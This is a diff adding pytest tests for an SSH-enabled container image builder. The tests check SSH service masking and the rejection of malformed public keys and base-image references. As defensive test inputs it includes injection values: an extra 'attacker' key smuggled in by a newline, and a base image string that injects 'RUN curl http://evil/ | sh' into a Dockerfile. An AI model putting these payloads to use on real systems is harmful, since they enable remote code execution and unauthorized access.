@@ -757,6 +757,21 @@ class TestTemplateRendering:
             )
         build.assert_called_once()
 
+    def test_l0g_template_masks_default_tcp_ssh_service(self) -> None:
+        """The post-install ``ssh.service`` / ``sshd.service`` is masked.
+
+        ``openssh-server``'s post-install on many distros enables the
+        TCP-listening service.  Our socket-activated path covers vsock;
+        we must additionally mask the daemon-mode unit so it can't come
+        up behind our back and start binding TCP/22.
+        """
+        # deb maps to ``ssh.service``
+        deb = render_l0g("ubuntu:24.04", family="deb", host_pubkey="ssh-ed25519 AAAA t")
+        assert "systemctl mask ssh.service" in deb
+        # rpm maps to ``sshd.service``
+        rpm = render_l0g("fedora:44", family="rpm", host_pubkey="ssh-ed25519 AAAA t")
+        assert "systemctl mask sshd.service" in rpm
+
     def test_build_l0g_full_rebuild_forwards_no_cache_and_pull_always(self, tmp_path: Path) -> None:
         """``full_rebuild=True`` reaches the podman invocation with cache-busting."""
         from unittest.mock import patch
@@ -800,6 +815,70 @@ class TestTemplateRendering:
         # caller never has to worry about leaking ``terok-executor-l0g-*``
         # directories.
         assert not df.parent.exists()
+
+    def test_build_l0g_rejects_pubkey_with_newline(self) -> None:
+        """Multi-line pubkey would add extra trust entries to authorized_keys."""
+        with pytest.raises(BuildError, match="single line"):
+            build_l0g_image(
+                "fedora:44",
+                host_pubkey="ssh-ed25519 AAAA t\nssh-ed25519 AAAB attacker",
+            )
+
+    def test_build_l0g_rejects_pubkey_with_embedded_carriage_return(self) -> None:
+        """A CR in the middle of the line would split the printf write.
+
+        Trailing ``\\r\\n`` is fine — it's stripped before validation.
+        Only embedded CRs are problematic.
+        """
+        with pytest.raises(BuildError, match="single line"):
+            build_l0g_image(
+                "fedora:44",
+                host_pubkey="ssh-ed25519 AAAA\rrogue",
+            )
+
+    def test_build_l0g_rejects_malformed_pubkey(self) -> None:
+        """A non-OpenSSH-shaped string is refused before reaching podman build."""
+        with pytest.raises(BuildError, match="not a recognisable OpenSSH"):
+            build_l0g_image("fedora:44", host_pubkey="not-a-key garbage")
+
+    def test_build_l0g_accepts_pubkey_with_comment(self) -> None:
+        """Standard ``ssh-… <b64> <comment>`` lines round-trip cleanly."""
+        from unittest.mock import patch
+
+        with (
+            patch("terok_executor.container.build._check_podman"),
+            patch("terok_executor.container.build._image_exists", return_value=False),
+            patch("terok_executor.container.build.build_project_image"),
+        ):
+            tag = build_l0g_image(
+                "fedora:44",
+                host_pubkey="ssh-ed25519 AAAA krun-host (terok)",
+            )
+        assert tag == "terok-l0g:fedora-44"
+
+    def test_build_l0g_rejects_base_image_with_newline(self) -> None:
+        """A newline in base_image would inject Dockerfile directives."""
+        with pytest.raises(BuildError, match="whitespace or control"):
+            build_l0g_image(
+                "fedora:44\nRUN curl http://evil/ | sh",
+                host_pubkey="ssh-ed25519 AAAA t",
+            )
+
+    def test_build_l0g_rejects_base_image_with_control_char(self) -> None:
+        """Embedded null/ESC similarly forbidden."""
+        with pytest.raises(BuildError, match="whitespace or control"):
+            build_l0g_image(
+                "fedora:44\x00",
+                host_pubkey="ssh-ed25519 AAAA t",
+            )
+
+    def test_build_l0g_rejects_malformed_base_image(self) -> None:
+        """Refs that don't match the loose OCI shape are refused."""
+        with pytest.raises(BuildError, match="OCI reference shape"):
+            build_l0g_image(
+                "!!!not-a-ref!!!",
+                host_pubkey="ssh-ed25519 AAAA t",
+            )
 
     def test_build_l0g_translates_oswrite_failure_to_build_error(self, tmp_path: Path) -> None:
         """A failed Dockerfile write surfaces as ``BuildError`` with context."""
